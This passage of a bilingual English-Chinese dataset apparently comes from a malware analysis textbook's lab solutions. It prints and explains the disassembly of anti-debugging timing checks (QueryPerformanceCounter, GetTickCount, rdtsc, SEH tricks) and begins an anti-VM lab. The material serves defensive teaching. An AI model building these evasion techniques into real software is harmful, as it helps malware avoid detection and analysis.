  id: totrans-5635
  prefs: []
  type: TYPE_NORMAL
  zh: 1\.
- en: There aren’t many useful strings in the malware other than import functions
    and the strings cmd and cmd.exe.
  id: totrans-5636
  prefs: []
  type: TYPE_NORMAL
  zh: 除了导入函数和字符串 cmd 以及 cmd.exe 之外，恶意软件中几乎没有其他有用的字符串。
- en: 2\.
  id: totrans-5637
  prefs: []
  type: TYPE_NORMAL
  zh: 2\.
- en: When you run this malware, it appears to do nothing other than terminate.
  id: totrans-5638
  prefs: []
  type: TYPE_NORMAL
  zh: 当你运行这个恶意软件时，它看起来除了终止之外什么也不做。
- en: 3\.
  id: totrans-5639
  prefs: []
  type: TYPE_NORMAL
  zh: 3\.
- en: You must rename the malware to *peo.exe* for it to run properly.
  id: totrans-5640
  prefs: []
  type: TYPE_NORMAL
  zh: 你必须将恶意软件重命名为 *peo.exe* 才能正常运行。
- en: 4\.
  id: totrans-5641
  prefs: []
  type: TYPE_NORMAL
  zh: 4\.
- en: 'This malware uses three different anti-debugging timing techniques: rdtsc,
    GetTickCount, and QueryPerformanceCounter.'
  id: totrans-5642
  prefs: []
  type: TYPE_NORMAL
  zh: 这种恶意软件使用了三种不同的反调试定时技术：rdtsc、GetTickCount 和 QueryPerformanceCounter。
- en: 5\.
  id: totrans-5643
  prefs: []
  type: TYPE_NORMAL
  zh: 5\.
- en: If the QueryPerformanceCounter check is successful, the malware modifies the
    string needed for the program to run properly. If the GetTickCount check is successful,
    the malware causes an unhandled exception that **1 6**
  id: totrans-5644
  prefs: []
  type: TYPE_NORMAL
  zh: 如果 QueryPerformanceCounter 检查成功，恶意软件会修改程序正常运行所需的字符串。如果 GetTickCount 检查成功，恶意软件将引发未处理的异常，**1
    6**
- en: crashes the program. If the rdtsc check is successful, the malware will attempt
    to delete itself from disk.
  id: totrans-5645
  prefs: []
  type: TYPE_NORMAL
  zh: 导致程序崩溃。如果 rdtsc 检查成功，恶意软件将尝试从磁盘删除自身。
- en: 6\.
  id: totrans-5646
  prefs: []
  type: TYPE_NORMAL
  zh: 6\.
- en: The anti-debugging timing checks are successful because the malware causes and
    catches an exception that it handles by manipulating the Structured Exception
    Handling (SEH) mechanism to include its own exception handler in between two calls
    to the timing checking functions.
  id: totrans-5647
  prefs: []
  type: TYPE_NORMAL
  zh: 反调试时间检查成功，因为恶意软件引发并捕获了一个异常，它通过操纵结构化异常处理（SEH）机制来处理该异常，在两次调用时间检查函数之间包含自己的异常处理程序。
- en: Exceptions are handled much more slowly in a debugger than outside a debugger.
  id: totrans-5648
  prefs: []
  type: TYPE_NORMAL
  zh: 与调试器外部相比，异常处理在调试器中要慢得多。
- en: 7\.
  id: totrans-5649
  prefs: []
  type: TYPE_NORMAL
  zh: 7\.
- en: The malware uses the domain name *adg.malwareanalysisbook.com*.
  id: totrans-5650
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件使用域名 *adg.malwareanalysisbook.com*。
- en: '***Detailed Analysis***'
  id: totrans-5651
  prefs: []
  type: TYPE_NORMAL
  zh: '***详细分析***'
- en: As noted in the lab description, this malware is the same as *Lab09-02.exe*,
    except with added anti-debugging techniques. A good place to start is by Solutions
    to Labs
  id: totrans-5652
  prefs: []
  type: TYPE_NORMAL
  zh: 如实验室描述中所述，这种恶意软件与 *Lab09-02.exe* 相同，只是增加了反调试技术。一个好的开始是查看实验室解决方案
- en: '**665**'
  id: totrans-5653
  prefs: []
  type: TYPE_NORMAL
  zh: '**665**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5654
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: doing Lab 9-2 or by reviewing your answers to refresh your memory of this malware’s
    capabilities.
  id: totrans-5655
  prefs: []
  type: TYPE_NORMAL
  zh: 通过做实验 9-2 或回顾你的答案来刷新你对这种恶意软件功能的记忆。
- en: Static analysis of *Lab16-03.exe* shows it to be similar to *Lab09-02.exe*,
    with few strings visible other than cmd.exe. When we load *Lab16-03.exe* into
    IDA Pro, we see that much of the same functionality is present in this malware.
  id: totrans-5656
  prefs: []
  type: TYPE_NORMAL
  zh: 静态分析 *Lab16-03.exe* 显示它与 *Lab09-02.exe* 类似，除了 cmd.exe 之外几乎没有可见的字符串。当我们把 *Lab16-03.exe*
    加载到 IDA Pro 中时，我们看到这个恶意软件中存在许多相同的功能。
- en: Listing 16-10L shows the malware using gethostbyname to resolve a domain and
    using port 9999, as with Lab 9-2\.
  id: totrans-5657
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 16-10L 显示恶意软件使用 gethostbyname 解析域名并使用端口 9999，与实验 9-2 相同。
- en: 004015DB call ds:gethostbyname
  id: totrans-5658
  prefs: []
  type: TYPE_NORMAL
  zh: 004015DB call ds:gethostbyname
- en: '...'
  id: totrans-5659
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 0040160D push 9999 ; hostshort 00401612 call ds:htons
  id: totrans-5660
  prefs: []
  type: TYPE_NORMAL
  zh: 0040160D push 9999 ; hostshort 00401612 call ds:htons
- en: '*Listing 16-10L: Same calls from Lab 9-2, which resolve a domain name and get
    a port in* *network byte order*'
  id: totrans-5661
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 16-10L：与实验 9-2 相同的调用，解析域名并获取网络字节顺序的端口* '
- en: Since this malware uses DNS and connects out over port 9999, we set up a dynamic
    environment using ApateDNS and Netcat. However, when we first run the malware,
    it doesn’t perform DNS or connect on port 9999\. Recall from Lab 9-2 that the
    name of the malware needed to be *ocl.exe*. Let’s see if that is the case here.
  id: totrans-5662
  prefs: []
  type: TYPE_NORMAL
  zh: 由于这种恶意软件使用 DNS 并通过端口 9999 连接，我们使用 ApateDNS 和 Netcat 设置了一个动态环境。然而，当我们第一次运行恶意软件时，它没有执行
    DNS 或在端口 9999 上连接。回想一下实验 9-2，恶意软件的名称需要是 *ocl.exe*。让我们看看这里是否也是这样。
- en: 'Two strings appear to be created on the stack at the start of the malware’s
    main function: 1qbz2wsx3edc and ocl.exe. We rename the malware to *ocl.exe* to
    see if it connects out. It doesn’t, which means the name *ocl.exe* must be modified
    before the comparison.'
  id: totrans-5663
  prefs: []
  type: TYPE_NORMAL
  zh: 在恶意软件主函数开始时，似乎在堆栈上创建了两个字符串：1qbz2wsx3edc 和 ocl.exe。我们将恶意软件重命名为 *ocl.exe* 以查看它是否连接出去。它没有，这意味着在比较之前必须修改名称
    *ocl.exe*。
- en: Listing 16-11L shows the string comparison that checks to see if the launched
    malware has the correct name.
  id: totrans-5664
  prefs: []
  type: TYPE_NORMAL
  zh: 列表 16-11L 显示了字符串比较，检查启动的恶意软件是否具有正确的名称。
- en: 0040150A mov ecx, [ebp+Str2] 
  id: totrans-5665
  prefs: []
  type: TYPE_NORMAL
  zh: 0040150A mov ecx, [ebp+Str2] 
- en: 00401510 push ecx ; Str2
  id: totrans-5666
  prefs: []
  type: TYPE_NORMAL
  zh: 00401510 push ecx ; Str2
- en: 00401511 lea edx, [ebp+Str1] 
  id: totrans-5667
  prefs: []
  type: TYPE_NORMAL
  zh: 00401511 lea edx, [ebp+Str1] 
- en: 00401517 push edx ; Str1
  id: totrans-5668
  prefs: []
  type: TYPE_NORMAL
  zh: 00401517 push edx ; Str1
- en: 00401518 call _strncmp
  id: totrans-5669
  prefs: []
  type: TYPE_NORMAL
  zh: 00401518 call _strncmp
- en: '*Listing 16-11L: Using strncmp for the module name comparison* At , we see
    Str2, which will contain the current name of the launched malware. At , we see
    Str1\. Looking back through the code, it seems Str1 is our ocl.exe string, but
    it is passed to sub_4011E0 before the comparison. Let’s load this malware into
    OllyDbg and set a breakpoint at the strncmp call at 0x401518\.'
  id: totrans-5670
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 16-11L：使用 strncmp 进行模块名称比较* 在  处，我们看到 Str2，它将包含启动的恶意软件的当前名称。在  处，我们看到
    Str1。回顾代码，似乎 Str1 是我们的 ocl.exe 字符串，但在比较之前传递给了 sub_4011E0。让我们将这个恶意软件加载到 OllyDbg
    中，并在 0x401518 处的 strncmp 调用处设置断点。'
- en: When we set the breakpoint and click play, we get a division-by-zero exception
    caught by OllyDbg. You can press SHIFT-F9 to pass the exception to the program
    or change the options to pass all exceptions to the program.
  id: totrans-5671
  prefs: []
  type: TYPE_NORMAL
  zh: 当我们设置断点并点击播放时，我们得到一个由 OllyDbg 捕获的除以零异常。你可以按 SHIFT-F9 将异常传递给程序或更改选项将所有异常传递给程序。
- en: After we pass the exception to the program, it is handled, and we arrive at
    the 0x401518 breakpoint. We see that qgr.exe is on the stack to be compared to
    Lab16-03.exe, so we try to rename the malware to *qgr.exe*. However, when we try
    to run it with the name *qgr.exe*, the malware still doesn’t perform a DNS query
    or connect out.
  id: totrans-5672
  prefs: []
  type: TYPE_NORMAL
  zh: 在我们将异常传递给程序后，它被处理，我们到达了0x401518断点。我们看到qgr.exe在栈上，要与其比较Lab16-03.exe，因此我们尝试将恶意软件重命名为*qgr.exe*。然而，当我们尝试以*qgr.exe*的名称运行它时，恶意软件仍然不会执行DNS查询或连接出去。
- en: '**666**'
  id: totrans-5673
  prefs: []
  type: TYPE_NORMAL
  zh: '**666**'
- en: Appendix C
  id: totrans-5674
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5675
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**The QueryPerformanceCounter Function** We need to review the sub_4011E0 function
    (where the ocl.exe string was passed) before the strncmp function. Examining sub_4011E0,
    we see that it calls QueryPerformanceCounter twice, as shown in Listing 16-12L
    (in bold).'
  id: totrans-5676
  prefs: []
  type: TYPE_NORMAL
  zh: '**QueryPerformanceCounter函数** 在strncmp函数之前，我们需要回顾sub_4011E0函数（其中传递了ocl.exe字符串）。检查sub_4011E0，我们看到它调用了两次QueryPerformanceCounter，如清单16-12L（粗体所示）所示。'
- en: 00401219 lea eax, [ebp+PerformanceCount]
  id: totrans-5677
  prefs: []
  type: TYPE_NORMAL
  zh: 00401219 lea eax, [ebp+PerformanceCount]
- en: 0040121C push eax ; lpPerformanceCount 0040121D call ds:**QueryPerformanceCounter**
  id: totrans-5678
  prefs: []
  type: TYPE_NORMAL
  zh: 0040121C push eax ; lpPerformanceCount 0040121D call ds:**QueryPerformanceCounter**
- en: '...'
  id: totrans-5679
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 0040126A lea ecx, [ebp+var_110]
  id: totrans-5680
  prefs: []
  type: TYPE_NORMAL
  zh: 0040126A lea ecx, [ebp+var_110]
- en: 00401270 push ecx ; lpPerformanceCount 00401271 call ds:**QueryPerformanceCounter**
  id: totrans-5681
  prefs: []
  type: TYPE_NORMAL
  zh: 00401270 push ecx ; lpPerformanceCount 00401271 call ds:**QueryPerformanceCounter**
- en: 00401277 mov edx, [ebp+var_110]
  id: totrans-5682
  prefs: []
  type: TYPE_NORMAL
  zh: 00401277 mov edx, [ebp+var_110]
- en: 0040127D sub edx, dword ptr [ebp+PerformanceCount] 
  id: totrans-5683
  prefs: []
  type: TYPE_NORMAL
  zh: 0040127D sub edx, dword ptr [ebp+PerformanceCount] 
- en: 00401280 mov [ebp+var_114], edx
  id: totrans-5684
  prefs: []
  type: TYPE_NORMAL
  zh: 00401280 mov [ebp+var_114], edx
- en: 00401286 cmp [ebp+var_114], 4B0h 
  id: totrans-5685
  prefs: []
  type: TYPE_NORMAL
  zh: 00401286 cmp [ebp+var_114], 4B0h 
- en: 00401290 jle short loc_40129C
  id: totrans-5686
  prefs: []
  type: TYPE_NORMAL
  zh: 00401290 jle short loc_40129C
- en: 00401292 mov [ebp+var_118], 2 
  id: totrans-5687
  prefs: []
  type: TYPE_NORMAL
  zh: 00401292 mov [ebp+var_118], 2 
- en: '*Listing 16-12L: Anti-debugging timing check using QueryPerformanceCounter*
    The two calls to QueryPerformanceCounter surround code that we will examine shortly,
    but for now we’ll look at the rest of the function. The malware subtracts the
    first-time capture (lpPerformanceCount) from the second-time capture (var_110)
    at . Next, at , the malware compares the result of the time difference to 0x4B0
    (1200 in decimal). If the time difference exceeds 1200, var_118 is set to 2; otherwise,
    it will stay at 1 (its initialized value).'
  id: totrans-5688
  prefs: []
  type: TYPE_NORMAL
  zh: '*清单16-12L：使用QueryPerformanceCounter进行的反调试定时检查* 两个对QueryPerformanceCounter的调用包围着我们将要检查的代码，但到目前为止，我们将查看函数的其余部分。恶意软件从第一次捕获（lpPerformanceCount）减去第二次捕获（var_110）。接下来，在处，恶意软件将时间差的结果与0x4B0（十进制中的1200）比较。如果时间差超过1200，var_118将被设置为2；否则，它将保持在1（其初始化值）。'
- en: Immediately following this check is the start of a for loop at 0x40129C.
  id: totrans-5689
  prefs: []
  type: TYPE_NORMAL
  zh: 在此检查之后，紧接着是0x40129C处的for循环的开始。
- en: The loop (not shown here) manipulates the string passed into the function (arg_0)
    using var_118; therefore, the QueryPerformanceCounter check influences the string
    result. The string used in strncmp is different in a debugger versus when run
    normally. To get the correct string, we’ll make sure that var_118
  id: totrans-5690
  prefs: []
  type: TYPE_NORMAL
  zh: （循环未在此处显示）使用var_118操作传递给函数的字符串（arg_0）。因此，QueryPerformanceCounter检查影响了字符串结果。在调试器中与正常运行时相比，strncmp中使用的字符串不同。为了获得正确的字符串，我们将确保var_118
- en: is set to 1 when this loop is entered. To do this, we set a breakpoint at the
    strncmp and NOP-out the instruction at . Now we see that the filename must be
    *peo.exe* in order for the malware to run properly outside a debugger.
  id: totrans-5691
  prefs: []
  type: TYPE_NORMAL
  zh: 当进入此循环时，is设置为1。为此，我们在strncmp处设置断点，并NOP掉处的指令。现在我们看到，为了使恶意软件在调试器外正确运行，文件名必须是*peo.exe*。
- en: '**1 6**'
  id: totrans-5692
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 6**'
- en: Let’s examine the code surrounded by the two calls to QueryPerformanceCounter.
  id: totrans-5693
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们检查由两个QueryPerformanceCounter调用包围的代码。
- en: Listing 16-13L shows the code that starts with a call/pop combination to get
    the current EIP into the EAX register.
  id: totrans-5694
  prefs: []
  type: TYPE_NORMAL
  zh: 清单16-13L显示了以call/pop组合开始的代码，用于将当前EIP放入EAX寄存器。
- en: 00401223 call $+5
  id: totrans-5695
  prefs: []
  type: TYPE_NORMAL
  zh: 00401223 call $+5
- en: 00401228 pop eax
  id: totrans-5696
  prefs: []
  type: TYPE_NORMAL
  zh: 00401228 pop eax
- en: 00401229 xor ecx, ecx
  id: totrans-5697
  prefs: []
  type: TYPE_NORMAL
  zh: 00401229 xor ecx, ecx
- en: 0040122B mov edi, eax
  id: totrans-5698
  prefs: []
  type: TYPE_NORMAL
  zh: 0040122B mov edi, eax
- en: 0040122D xor ebx, ebx
  id: totrans-5699
  prefs: []
  type: TYPE_NORMAL
  zh: 0040122D xor ebx, ebx
- en: 0040122F add ebx, 2Ch 
  id: totrans-5700
  prefs: []
  type: TYPE_NORMAL
  zh: 0040122F add ebx, 2Ch 
- en: 00401232 add eax, ebx
  id: totrans-5701
  prefs: []
  type: TYPE_NORMAL
  zh: 00401232 add eax, ebx
- en: 00401234 push eax 
  id: totrans-5702
  prefs: []
  type: TYPE_NORMAL
  zh: 00401234 push eax 
- en: 00401235 push large dword ptr fs:0
  id: totrans-5703
  prefs: []
  type: TYPE_NORMAL
  zh: 00401235 push large dword ptr fs:0
- en: 0040123C mov large fs:0, esp 
  id: totrans-5704
  prefs: []
  type: TYPE_NORMAL
  zh: 0040123C mov large fs:0, esp 
- en: 00401243 div ecx
  id: totrans-5705
  prefs: []
  type: TYPE_NORMAL
  zh: 00401243 div ecx
- en: 00401245 sub edi, 0D6Ah
  id: totrans-5706
  prefs: []
  type: TYPE_NORMAL
  zh: 00401245 sub edi, 0D6Ah
- en: Solutions to Labs
  id: totrans-5707
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**667**'
  id: totrans-5708
  prefs: []
  type: TYPE_NORMAL
  zh: '**667**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5709
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: 0040124B mov ecx, 0Ch
  id: totrans-5710
  prefs: []
  type: TYPE_NORMAL
  zh: 0040124B mov ecx, 0Ch
- en: 00401250 jmp short loc_401262
  id: totrans-5711
  prefs: []
  type: TYPE_NORMAL
  zh: 00401250 jmp short loc_401262
- en: 00401252 repne stosb
  id: totrans-5712
  prefs: []
  type: TYPE_NORMAL
  zh: 00401252 repne stosb
- en: 00401254 mov ecx, [esp+0Ch] 
  id: totrans-5713
  prefs: []
  type: TYPE_NORMAL
  zh: 00401254 mov ecx, [esp+0Ch] 
- en: 00401258 add dword ptr [ecx+0B8h], 2
  id: totrans-5714
  prefs: []
  type: TYPE_NORMAL
  zh: 00401258 add dword ptr [ecx+0B8h], 2
- en: 0040125F xor eax, eax
  id: totrans-5715
  prefs: []
  type: TYPE_NORMAL
  zh: 0040125F xor eax, eax
- en: 00401261 retn
  id: totrans-5716
  prefs: []
  type: TYPE_NORMAL
  zh: 00401261 retn
- en: 00401262 pop large dword ptr fs:0 
  id: totrans-5717
  prefs: []
  type: TYPE_NORMAL
  zh: 00401262 pop large dword ptr fs:0 
- en: 00401269 pop eax
  id: totrans-5718
  prefs: []
  type: TYPE_NORMAL
  zh: 00401269 pop eax
- en: '*Listing 16-13L: Malware setting its own exception handler and triggering an
    exception* Once the malware gets the current EIP into EAX it adds 0x2C to it at
    .'
  id: totrans-5719
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表16-13L：恶意软件设置自己的异常处理程序并触发异常* 一旦恶意软件将当前的EIP放入EAX，它就在处向其添加0x2C。'
- en: This causes the EAX register to contain 0x2C + 0x401228 = 0x401254, which references
    the code starting at . Next, the malware modifies SEH to insert the 0x401254
    address into the SEH call chain, as explained in Chapter 15\.
  id: totrans-5720
  prefs: []
  type: TYPE_NORMAL
  zh: 这导致EAX寄存器包含0x2C + 0x401228 = 0x401254，它引用了处的代码。接下来，恶意软件修改SEH以将0x401254地址插入SEH调用链，如第15章所述。
- en: This manipulation happens from  through . When the div ecx instruction executes,
    it causes a divide-by-zero exception to occur because ECX is set to 0
  id: totrans-5721
  prefs: []
  type: TYPE_NORMAL
  zh: 这种操作发生在到之间。当div ecx指令执行时，由于ECX被设置为0，它会导致除以零异常发生。
- en: earlier in the code, and this, in turn, causes the malware exception handler
    to execute at . The next two instructions process the divide-by-zero exception
    before returning execution to just after the division by zero. Execution will
    eventually lead to , where the SEH chain is restored by removing the malware’s
    exception handler.
  id: totrans-5722
  prefs: []
  type: TYPE_NORMAL
  zh: 在代码的早期部分，这反过来又导致恶意软件异常处理程序在处执行。接下来的两条指令在返回执行到除以零之后处理除以零异常。
- en: The malware goes through all of this trouble to execute code that has a drastic
    time difference inside a debugger versus outside a debugger. As we explained in
    Chapter 8, exceptions are handled differently when running in a debugger and take
    a little bit longer to process. That small time delta is enough for the malware
    to determine if it is executing in a debugger.
  id: totrans-5723
  prefs: []
  type: TYPE_NORMAL
  zh: 恶意软件经历所有这些麻烦来执行在调试器内部与外部具有剧烈时间差异的代码。正如我们在第8章中解释的，当在调试器中运行时，异常的处理方式不同，处理时间会稍微长一些。这个小的时差足以让恶意软件确定它是否在调试器中执行。
- en: '**The GetTickCount Function**'
  id: totrans-5724
  prefs: []
  type: TYPE_NORMAL
  zh: '**“GetTickCount 函数”**'
- en: Next, we set a breakpoint at gethostbyname at 0x4015DB in order to see the domain
    name used by the malware, and we see that the malware terminates without hitting
    the breakpoint. Examining the code in the main function, we see two calls to GetTickCount,
    as shown in Listing 16-14L (in bold).
  id: totrans-5725
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们在0x4015DB处的gethostbyname设置一个断点，以便查看恶意软件使用的域名，我们看到恶意软件在未触碰到断点的情况下终止。检查主函数中的代码，我们看到有两个对GetTickCount的调用，如列表16-14L（粗体所示）。
- en: 00401584 call ds:**GetTickCount**
  id: totrans-5726
  prefs: []
  type: TYPE_NORMAL
  zh: 00401584 call ds:**GetTickCount**
- en: 0040158A mov [ebp+var_2B4], eax
  id: totrans-5727
  prefs: []
  type: TYPE_NORMAL
  zh: 0040158A mov [ebp+var_2B4], eax
- en: 00401590 call sub_401000 
  id: totrans-5728
  prefs: []
  type: TYPE_NORMAL
  zh: 00401590 call sub_401000 
- en: 00401595 call ds:**GetTickCount**
  id: totrans-5729
  prefs: []
  type: TYPE_NORMAL
  zh: 00401595 call ds:**GetTickCount**
- en: 0040159B mov [ebp+var_2BC], eax
  id: totrans-5730
  prefs: []
  type: TYPE_NORMAL
  zh: 0040159B mov [ebp+var_2BC], eax
- en: 004015A1 mov ecx, [ebp+var_2BC]
  id: totrans-5731
  prefs: []
  type: TYPE_NORMAL
  zh: 004015A1 mov ecx, [ebp+var_2BC]
- en: 004015A7 sub ecx, [ebp+var_2B4]
  id: totrans-5732
  prefs: []
  type: TYPE_NORMAL
  zh: 004015A7 sub ecx, [ebp+var_2B4]
- en: 004015AD cmp ecx, 1 
  id: totrans-5733
  prefs: []
  type: TYPE_NORMAL
  zh: 004015AD cmp ecx, 1 
- en: 004015B0 jbe short loc_4015B7 
  id: totrans-5734
  prefs: []
  type: TYPE_NORMAL
  zh: 004015B0 jbe short loc_4015B7 
- en: 004015B2 xor eax, eax
  id: totrans-5735
  prefs: []
  type: TYPE_NORMAL
  zh: 004015B2 xor eax, eax
- en: 004015B4 mov [eax], edx 
  id: totrans-5736
  prefs: []
  type: TYPE_NORMAL
  zh: 004015B4 mov [eax], edx 
- en: 004015B6 retn
  id: totrans-5737
  prefs: []
  type: TYPE_NORMAL
  zh: 004015B6 retn
- en: '*Listing 16-14L: Anti-debugging timing check using GetTickCount* **668**'
  id: totrans-5738
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表16-14L：使用GetTickCount进行反调试定时检查** **668**'
- en: Appendix C
  id: totrans-5739
  prefs: []
  type: TYPE_NORMAL
  zh: 附录C
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5740
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: Between the two calls to GetTickCount, the call to sub_401000 at  contains
    the same SEH manipulation code we saw in the QueryPerformanceCounter method we
    analyzed previously. Next, at , the malware compares the result of the time difference
    in milliseconds. If the time difference exceeds one millisecond, the code executes
    the instruction at , which is illegal because EAX is set to 0 in the previous
    instruction. This causes the malware to crash. To fix this, we just need to make
    sure that the jump at  is taken.
  id: totrans-5741
  prefs: []
  type: TYPE_NORMAL
  zh: 在两次对GetTickCount的调用之间，处的sub_401000调用包含我们在之前分析QueryPerformanceCounter方法时看到的相同的SEH操作代码。接下来，在处，恶意软件比较毫秒级时间差的结果。如果时间差超过一毫秒，代码将执行处的指令，这是非法的，因为在之前的指令中EAX被设置为0。这导致恶意软件崩溃。为了修复这个问题，我们只需要确保处的跳转被执行。
- en: '**The rdtsc Instruction**'
  id: totrans-5742
  prefs: []
  type: TYPE_NORMAL
  zh: '**“rdtsc 指令”**'
- en: Examining the decoding method sub_401300, we see that the code in Lab 16-3
  id: totrans-5743
  prefs: []
  type: TYPE_NORMAL
  zh: 检查解码方法sub_401300，我们看到第16-3实验室中的代码
- en: differs from the decoding method in Lab 9-2\. In Lab 16-3, we find that the
    rdtsc instruction is used twice, and the familiar SEH manipulation code is in
    between. The rdtsc instructions are shown in Listing 16-15L (in bold), and we
    have omitted the SEH manipulation code from the listing.
  id: totrans-5744
  prefs: []
  type: TYPE_NORMAL
  zh: 与第9-2实验室中的解码方法不同。在第16-3实验室中，我们发现rdtsc指令被使用了两次，而熟悉的SEH操作代码位于其中。rdtsc指令在列表16-15L（粗体）中显示，我们已从列表中省略了SEH操作代码。
- en: 00401323 **rdtsc**
  id: totrans-5745
  prefs: []
  type: TYPE_NORMAL
  zh: 00401323 **rdtsc**
- en: 00401325 push eax 
  id: totrans-5746
  prefs: []
  type: TYPE_NORMAL
  zh: 00401325 push eax 
- en: '...'
  id: totrans-5747
  prefs: []
  type: TYPE_NORMAL
  zh: '...'
- en: 0040136D **rdtsc**
  id: totrans-5748
  prefs: []
  type: TYPE_NORMAL
  zh: 0040136D **rdtsc**
- en: 0040136F sub eax, [esp+20h+var_20] 
  id: totrans-5749
  prefs: []
  type: TYPE_NORMAL
  zh: 0040136F sub eax, [esp+20h+var_20] 
- en: 00401372 mov [ebp+var_4], eax
  id: totrans-5750
  prefs: []
  type: TYPE_NORMAL
  zh: 00401372 mov [ebp+var_4], eax
- en: 00401375 pop eax
  id: totrans-5751
  prefs: []
  type: TYPE_NORMAL
  zh: 00401375 pop eax
- en: 00401376 pop eax
  id: totrans-5752
  prefs: []
  type: TYPE_NORMAL
  zh: 00401376 pop eax
- en: 00401377 cmp [ebp+var_4], 7A120h 
  id: totrans-5753
  prefs: []
  type: TYPE_NORMAL
  zh: 00401377 cmp [ebp+var_4], 7A120h 
- en: 0040137E jbe short loc_401385
  id: totrans-5754
  prefs: []
  type: TYPE_NORMAL
  zh: 0040137E jbe short loc_401385
- en: 00401380 call sub_4010E0 
  id: totrans-5755
  prefs: []
  type: TYPE_NORMAL
  zh: 00401380 call sub_4010E0 
- en: '*Listing 16-15L: Anti-debugging timing check using rdtsc* The malware pushes
    the result of the rdtsc instruction onto the stack at , and later executes the
    rdtsc instruction again, this time subtracting the value it previously pushed
    onto the stack from the result (EAX) at . IDA Pro has mislabeled the first result
    as a local variable, var_20\. To correct this, right-click var_20 and change the
    instruction to appear as sub eax, [esp].'
  id: totrans-5756
  prefs: []
  type: TYPE_NORMAL
  zh: '*列表 16-15L：使用 rdtsc 的防调试时间检查* 恶意软件将 rdtsc 指令的结果推送到堆栈上（），然后再次执行 rdtsc 指令，这次从之前推送到堆栈的值（EAX）中减去。IDA
    Pro 将第一个结果错误地标记为局部变量，var_20。要纠正这一点，右键单击 var_20 并将指令更改为 sub eax, [esp]。'
- en: Next, the time difference is stored in var_4 and compared to 0x7A120
  id: totrans-5757
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，时间差存储在 var_4 中，并与 0x7A120 进行比较
- en: '**1 6**'
  id: totrans-5758
  prefs: []
  type: TYPE_NORMAL
  zh: '**1 6**'
- en: (500000 in decimal) at . If the time difference exceeds 500000, sub_4010E0
    is called at . The sub_4010E0 function attempts to delete the malware from disk,
    but fails since it is running inside the debugger. Nevertheless, the malware will
    terminate because of the call to exit at the end of the function.
  id: totrans-5759
  prefs: []
  type: TYPE_NORMAL
  zh: （500000 十进制）在 。如果时间差超过 500000，则在  处调用 sub_4010E0。sub_4010E0 函数试图从磁盘删除恶意软件，但由于它在调试器中运行而失败。尽管如此，由于函数末尾的
    exit 调用，恶意软件将终止。
- en: '**Summary**'
  id: totrans-5760
  prefs: []
  type: TYPE_NORMAL
  zh: '**总结**'
- en: 'Lab 16-3 uses three different anti-debugging techniques to thwart analysis
    of the malware inside a debugger: QueryPerformanceCounter, GetTickCount, and rdtsc.
    The easiest way to beat this malware at its own game is to NOP-out the jumps or
    force them to be taken by changing them from conditional to non-conditional jumps.
    Once we figure out how to rename the malware (to *peo.exe*) in a debugger, we
    can exit the debugger, rename the file, and effectively use basic dynamic analysis
    techniques.'
  id: totrans-5761
  prefs: []
  type: TYPE_NORMAL
  zh: Lab 16-3 使用三种不同的防调试技术来阻止在调试器中对恶意软件进行分析：QueryPerformanceCounter、GetTickCount
    和 rdtsc。打败这种恶意软件的最佳方式是将跳转指令 NOP-out 或强制它们执行，即将它们从条件跳转更改为非条件跳转。一旦我们弄清楚如何在调试器中重命名恶意软件（到
    *peo.exe*），我们就可以退出调试器，重命名文件，并有效地使用基本的动态分析技术。
- en: Solutions to Labs
  id: totrans-5762
  prefs: []
  type: TYPE_NORMAL
  zh: 实验室解决方案
- en: '**669**'
  id: totrans-5763
  prefs: []
  type: TYPE_NORMAL
  zh: '**669**'
- en: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
  id: totrans-5764
  prefs: []
  type: TYPE_NORMAL
  zh: '[www.it-ebooks.info](http://www.it-ebooks.info/)'
- en: '**Lab 17-1 Solutions**'
  id: totrans-5765
  prefs: []
  type: TYPE_NORMAL
  zh: '**Lab 17-1 解决方案**'
- en: '***Short Answers***'
  id: totrans-5766
  prefs: []
  type: TYPE_NORMAL
  zh: '***简短回答***'
- en: 1\.
  id: totrans-5767
  prefs: []
  type: TYPE_NORMAL
  zh: '1.'
- en: This malware uses vulnerable x86 instructions to determine if it is running
    in a VM.
  id: totrans-5768
  prefs: []
  type: TYPE_NORMAL
  zh: 这种恶意软件使用易受攻击的 x86 指令来确定它是否在虚拟机中运行。
- en: 2\.
  id: totrans-5769
  prefs: []
  type: TYPE_NORMAL
  zh: '2.'
- en: 'The script finds three potential anti-VM instructions and highlights them in
    red: sidt, str, and sldt.'
  id: totrans-5770
  prefs: []
  type: TYPE_NORMAL
  zh: 脚本找到了三个潜在的防虚拟机指令，并用红色突出显示：sidt、str 和 sldt。
- en: 3\.
  id: totrans-5771
  prefs: []
  type: TYPE_NORMAL
  zh: '3.'
- en: The malware will delete itself if either sidt or str detects VMware. If the
    sldt instruction detects malware, the malware will exit without creating its main
    thread, but it will create the malicious service MalService.
  id: totrans-5772
  prefs: []
  type: TYPE_NORMAL
  zh: 如果 sidt 或 str 检测到 VMware，恶意软件将自行删除。如果 sldt 指令检测到恶意软件，恶意软件将退出而不创建主线程，但它将创建恶意服务
    MalService。
- en: 4\.
  id: totrans-5773
  prefs: []
